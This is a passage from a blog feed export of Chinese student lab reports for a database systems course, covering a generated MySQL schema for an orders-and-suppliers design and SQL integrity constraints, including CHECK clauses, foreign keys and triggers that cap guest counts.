code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">/*==============================================================*/<br>/* DBMS name:      MySQL 5.0                                    */<br>/* Created on:     2022/5/7 15:44:40                            */<br>/*==============================================================*/<br><br><br>drop table if exists Customer;<br><br>drop table if exists Lineitem;<br><br>drop table if exists Nation;<br><br>drop table if exists &quot;Order&quot;;<br><br>drop table if exists Part;<br><br>drop table if exists Region;<br><br>drop table if exists Supplier;<br><br>drop table if exists 供应;<br><br>/*==============================================================*/<br>/* Table: Customer                                              */<br>/*==============================================================*/<br>create table Customer<br>(<br>   custkey              int not null,<br>   name                 varchar(128),<br>   address              varchar(128),<br>   phone                varchar(128),<br>   nation               int,<br>   comment              varchar(128),<br>   primary key (custkey)<br>);<br><br>/*==============================================================*/<br>/* Table: Lineitem                                              */<br>/*==============================================================*/<br>create table Lineitem<br>(<br>   linenumber           int not null,<br>   orderkey             int,<br>   partkey2             int,<br>   suppkey2             int,<br>   quantity             int,<br>   extendedprice        float,<br>   discount             float,<br>   tax                  float,<br>   returnflag           bool,<br>   primary key (linenumber)<br>);<br><br>/*==============================================================*/<br>/* Table: Nation                                                */<br>/*==============================================================*/<br>create table Nation<br>(<br>   nationkey            int not null,<br>   name                 varchar(128),<br>   region               int,<br>   comment              varchar(128),<br>   primary key (nationkey)<br>);<br><br>/*==============================================================*/<br>/* Table: &quot;Order&quot;                                               */<br>/*==============================================================*/<br>create table &quot;Order&quot;<br>(<br>   orderkey             int not null,<br>   custkey              int,<br>   status               bool,<br>   totalprice           float,<br>   orderdate            date,<br>   orderpriority        int,<br>   clerk                varchar(128),<br>   shippriority         int,<br>   comment              varchar(128),<br>   primary key (orderkey)<br>);<br><br>/*==============================================================*/<br>/* Table: Part                                                  */<br>/*==============================================================*/<br>create table Part<br>(<br>   partkey              int not null,<br>   name                 varchar(128),<br>   mfgr                 varchar(128),<br>   brand                varchar(128),<br>   type                 varchar(128),<br>   size                 float,<br>   retailprice          float,<br>   container            varchar(128),<br>   comment              varchar(128),<br>   primary key (partkey)<br>);<br><br>/*==============================================================*/<br>/* Table: Region                                                */<br>/*==============================================================*/<br>create table Region<br>(<br>   regionkey            int not null,<br>   name                 varchar(128),<br>   comment              varchar(128),<br>   primary key (regionkey)<br>);<br><br>/*==============================================================*/<br>/* Table: Supplier                                              */<br>/*==============================================================*/<br>create table Supplier<br>(<br>   suppkey              int not null,<br>   name                 varchar(128),<br>   address              varchar(128),<br>   nation               int,<br>   phone                varchar(128),<br>   comment              varchar(128),<br>   primary key (suppkey)<br>);<br><br>/*==============================================================*/<br>/* Table: 供应                                                    */<br>/*==============================================================*/<br>create table 供应<br>(<br>   partkey              int not null,<br>   suppkey              int not null,<br>   primary key (partkey, suppkey)<br>);<br><br>alter table Customer add constraint FK_国籍 foreign key (nation)<br>      references Nation (nationkey) on delete restrict on update restrict;<br><br>alter table Lineitem add constraint FK_使用 foreign key (partkey2, suppkey2)<br>      references 供应 (partkey, suppkey) on delete restrict on update restrict;<br><br>alter table Lineitem add constraint FK_组成 foreign key (orderkey)<br>      references &quot;Order&quot; (orderkey) on delete restrict on update restrict;<br><br>alter table Nation add constraint FK_所在地区 foreign key (region)<br>      references Region (regionkey) on delete restrict on update restrict;<br><br>alter table &quot;Order&quot; add constraint FK_签订 foreign key (custkey)<br>      references Customer (custkey) on delete restrict on update restrict;<br><br>alter table Supplier add constraint FK_所在国家 foreign key (nation)<br>      references Nation (nationkey) on delete restrict on update restrict;<br><br>alter table 供应 add constraint FK_供应 foreign key (partkey)<br>      references Part (partkey) on delete restrict on update restrict;<br><br>alter table 供应 add constraint FK_供应2 foreign key (suppkey)<br>      references Supplier (suppkey) on delete restrict on update restrict;<br><br><br></code></pre></div></td></tr></table></figure></li><li><p>由于订单表的名称“Order”与Mysql的语句重复了，故把“Order”命名为“Order2”，在Navicat中运行：</p><p><img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507154608819.png" alt="image-20220507154608819"></p><p> <img src="/2022/05/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%94%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/image-20220507154625237.png" alt="image-20220507154625237"></p></li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>通过此次实验，我掌握了数据库设计的基本过程，对数据库的概念结构、逻辑结构、物理结构都有了深刻的把握。同时，本次实验过程中，需要注意几个细节：</p><ul><li>画实体-关系图，设计概念模型时，就需要根据实际情况把握实体间的联系。此次我对实体间1:n、m:n甚至1:1:n的联系都有了更深的理解，其中m:n的联系会创建出一个新的关系模式，而1:1:n的联系在PowerDesigner工具中需要在下一步“逻辑结构”中实现。</li><li>设计逻辑结构时，若是从概念模型转化得到逻辑模型，则需要把握好参照表和被参照表间通过外键建立的联系，若自动生成了多余的外键，则需要手动进行调整。此外，务必注意参照属性和被参照属性间的数据类型需要设置成一致的，否则生成数据库时会报错。</li><li>对于物理结构，同样要根据实际需求确定存取方法，如B+树、Hash、聚簇，在课程中都有提及。遗憾的是PowerDesigner16.5并不支持设计较复杂的物理结构。</li><li>将逻辑模型转化为物理模型时，要注意选择的数据库管理系统应该和需求相一致。</li></ul>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验四：数据控制（完整性部分）</title>
    <link href="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/"/>
    <url>/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验四数据控制-完整性部分"><a href="#《数据库系统概论》课程之实验四数据控制-完整性部分" class="headerlink" title="《数据库系统概论》课程之实验四数据控制(完整性部分)"></a>《数据库系统概论》课程之实验四数据控制(完整性部分)</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h2><p>（1）熟悉通过SQL对数据进行完整性控制。</p><p>（2）完成书本上习题的上机练习。</p><h2 id="实验平台MySQL"><a href="#实验平台MySQL" class="headerlink" title="实验平台MySQL"></a>实验平台MySQL</h2><p>MySQL8.0及其图形化工具Navicat Premium。</p><h2 id="实验内容和要求"><a href="#实验内容和要求" class="headerlink" title="实验内容和要求"></a>实验内容和要求</h2><p>​        使用SQL对数据进行完整性控制（3类完整性、CHECK短语、CONSTRAIN子句、触发器）。用实验证实，当操作违反了完整性约束条件时，系统是如何处理的。根据以下要求认真填写实验报告，记录所有的实验用例。</p><p>教材：《数据库系统概论》第5版——第五章习题P172</p><h3 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h3><p>假设有下面两个关系模式：</p><p>职工（职工号，姓名，年龄，职务，工资，部门号），其中职工号为主码；</p><p>部门（部门号，名称，经理名，电话），其中部门号为主码。</p><p>  用SQL语言定义这两个关系模式，要求在模式中完成以下完整性约束条件的定义：</p><p>（1）定以每个模式的主码；（2）定义参照完整性；（3）定义职工年龄不得超过60岁。</p><h4 id="SQL实现"><a href="#SQL实现" class="headerlink" title="SQL实现"></a>SQL实现</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 部门(<br>部门号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>) <span class="hljs-keyword">PRIMARY</span> KEY, <span class="hljs-comment">-- 在列级定义主码，实现实体完整性</span><br>名称 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>经理名 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>电话 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>)<br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 职工 <br>(<br>职工号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>), <br>姓名 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>年龄 <span class="hljs-type">INT</span>,<br><span class="hljs-keyword">CHECK</span> (年龄<span class="hljs-operator">&lt;=</span><span class="hljs-number">60</span>),<span class="hljs-comment">-- 属性上的约束条件</span><br>职务 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>),<br>工资 <span class="hljs-keyword">DOUBLE</span>,<br>部门号 <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>),<br>    <span class="hljs-keyword">PRIMARY</span> KEY(职工号), <span class="hljs-comment">-- 在表级定义主码，实现实体完整性</span><br><span class="hljs-keyword">FOREIGN</span> KEY(部门号) <span class="hljs-keyword">REFERENCES</span> 部门(部门号) <span class="hljs-comment">-- 参照完整性</span><br>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413111847856-16654563523561.png" alt="image-20220413111847856"></p><h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><ul><li><p>先添加“部门”数据：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 部门 <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;保卫部&#x27;</span>,<span class="hljs-string">&#x27;小明&#x27;</span>,<span class="hljs-number">12345678</span>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413104315269-16654563523562.png" alt="image-20220413104315269"></p></li><li><p>添加年龄超过60岁的职工，失败</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 职工 <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;小强&#x27;</span>,<span class="hljs-number">65</span>,<span class="hljs-string">&#x27;保安&#x27;</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">2</span>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413104554984-16654563523573.png" alt="image-20220413104554984"></p></li><li><p>添加年龄不超过60岁的职工，成功</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 职工 <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;小刚&#x27;</span>,<span class="hljs-number">55</span>,<span class="hljs-string">&#x27;保安&#x27;</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">2</span>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413104655878-16654563523574.png" alt="image-20220413104655878"></p></li></ul><h3 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h3><p>​        某单位想举行一个小型的联谊会，关系Male记录注册的男宾信息，关系Female记录注册的女宾信息，建立一个断言，将来宾的人数限制在50人以内。（提示，先创建关系Female和关系Male）。</p><h4 id="SQL实现-1"><a href="#SQL实现-1" class="headerlink" title="SQL实现"></a>SQL实现</h4><ul><li><p>先创建关系，即建表：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Male(<br>id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>) <span class="hljs-keyword">PRIMARY</span> KEY,<br>name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>)<br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Female(<br>id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">31</span>) <span class="hljs-keyword">PRIMARY</span> KEY,<br>name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">15</span>)<br>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413105205330-16654563523577.png" alt="image-20220413105205330"></p></li><li><p>由于MySQL不支持ASSERTION断言，故使用触发器实现将来宾的人数限制在50人以内。</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">delimiter <span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> count_check_male before <span class="hljs-keyword">insert</span> <br><span class="hljs-keyword">on</span> Male <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-type">row</span><br><span class="hljs-keyword">begin</span><br>    <span class="hljs-keyword">declare</span> msg <span class="hljs-type">varchar</span>(<span class="hljs-number">200</span>);<br>    <span class="hljs-keyword">declare</span> count <span class="hljs-type">int</span>;<br>    <span class="hljs-keyword">set</span> count <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> Male) <span class="hljs-operator">+</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> Female);<br>    if (count <span class="hljs-operator">&gt;=</span> <span class="hljs-number">50</span>) <span class="hljs-keyword">then</span>  <span class="hljs-comment">-- 当前总来宾数为50</span><br>        <span class="hljs-keyword">set</span> msg <span class="hljs-operator">=</span> &quot;The maximum of guest is 50.&quot;;    <br>        signal <span class="hljs-keyword">sqlstate</span> <span class="hljs-string">&#x27;HY000&#x27;</span> <span class="hljs-keyword">SET</span> message_text <span class="hljs-operator">=</span> msg;     <span class="hljs-comment">-- 触发Mysql错误信号，定义其信息</span><br>    <span class="hljs-keyword">end</span> if;<br><span class="hljs-keyword">end</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> count_check_female before <span class="hljs-keyword">insert</span> <br><span class="hljs-keyword">on</span> Female <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-type">row</span><br><span class="hljs-keyword">begin</span><br>    <span class="hljs-keyword">declare</span> msg <span class="hljs-type">varchar</span>(<span class="hljs-number">200</span>);<br>    <span class="hljs-keyword">declare</span> count <span class="hljs-type">int</span>;<br>    <span class="hljs-keyword">set</span> count <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> Male) <span class="hljs-operator">+</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> Female);<br>    if (count <span class="hljs-operator">&gt;=</span> <span class="hljs-number">50</span>) <span class="hljs-keyword">then</span>  <span class="hljs-comment">-- 当前总来宾数为50</span><br>        <span class="hljs-keyword">set</span> msg <span class="hljs-operator">=</span> &quot;The maximum of guest is 50.&quot;;    <br>        signal <span class="hljs-keyword">sqlstate</span> <span class="hljs-string">&#x27;HY000&#x27;</span> <span class="hljs-keyword">SET</span> message_text <span class="hljs-operator">=</span> msg;    <span class="hljs-comment">-- 触发Mysql错误信号，定义其信息</span><br>    <span class="hljs-keyword">end</span> if;<br><span class="hljs-keyword">end</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span><br>delimiter ;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="测试：-1"><a href="#测试：-1" class="headerlink" title="测试："></a>测试：</h4><ul><li><p>50人数目过多，将触发器条件<code>count &gt;= 50</code>改为<code>count &gt;= 5</code>进行测试</p></li><li><p>查看当前两表字段数：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> Male;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> Female;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413111017559-16654563523575.png" alt="image-20220413111017559"></p><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413111031703-16654563523576.png" alt="image-20220413111031703"></p></li><li><p>再往Male表插入信息，插入失败得到错误信息：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Male <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;F&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%9B%9B%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%8C%E6%95%B4%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/image-20220413111404410-16654563523578.png" alt="image-20220413111404410"></p></li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>通过这次实验，我熟悉了如何在MySQL中使用SQL语句进行完整性控制，主要收获如下。</p><p>在第6题中，我掌握了如何在定义模式，即建表时实现数据库完整性，分别为：</p><ul><li>使用<code>PRIMARY KEY</code>定义主码实现实体完整性，可以在列级定义或表级定义。</li><li>通过定义<code>FOREIGN KEY</code>实现参照完整性。注意，若要在定义模式时定义外键，需要先定义主键作为其他表的外键的那个表。</li><li>通过<code>CHECK</code>实现属性的约束条件。</li></ul><p>在第7题中，由于MySQL不支持ASSERTION断言，故使用触发器实现断言的功能。对于某个操作的触发器，可以在其实现中加入判断语句，并使用<code>signal sqlstate &#39;HY000&#39;</code>定义错误信号使在某个条件下该操作能够失效，并输出错误信息。此外，通过巧妙的方法可以更方便地对我们的实现进行测试，保证其正确性。</p>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验三：数据控制（安全性部分）</title>
    <link href="/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/"/>
    <url>/2022/04/16/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E5%AE%89%E5%85%A8%E6%80%A7%E9%83%A8%E5%88%86%EF%BC%89/</url>
    
